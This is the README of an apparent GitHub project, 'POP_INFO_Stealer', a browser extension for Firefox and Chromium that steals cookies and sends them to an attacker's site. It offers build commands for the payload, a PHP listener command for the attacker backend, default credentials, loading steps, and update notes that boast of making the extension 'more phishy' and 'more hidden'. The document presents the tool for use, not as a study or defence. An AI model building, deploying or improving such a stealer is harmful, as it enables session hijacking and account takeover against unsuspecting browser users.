# POP_INFO_Stealer
firefox extension that steal browser cookies 
tested on Mozilla Firefox (115.6.0)
it send cookies to attacker site 


# Update v2
1) it woring on Chromium now  test on Chromium Version 120.0.6099.216
2) add pop window to make it more phishy
3) update c.php to make the extension more hidden

# requirements 
`python3
,
php
&
7z`
# building payload
`cd pop_add_bilder;python3 pop_add_bilder.py`


![ building payload](https://raw.githubusercontent.com/shiky8/POP_INFO_Stealer/main/dems/buliding.png)
# listener
`cd Attacker_backend;sudo php -S 127.0.0.1:80`
# username : root , password : toor
![ listener ](https://raw.githubusercontent.com/shiky8/POP_INFO_Stealer/main/dems/listener.png)

![ attacker](https://raw.githubusercontent.com/shiky8/POP_INFO_Stealer/main/dems/attacker.png)

# cleaning sessionStorage
`just load the manifest.json from clear_sessionStorage_add folder`


# testing 

for firefox go to

`about:debugging#/runtime/this-firefox`
for chrome got to 
`chrome://extensions/`

# Demo 
`https://drive.google.com/drive/folders/1alH9H5W3j4K7-gldPBqPgK8MXqI8cBSD?usp=sharing`

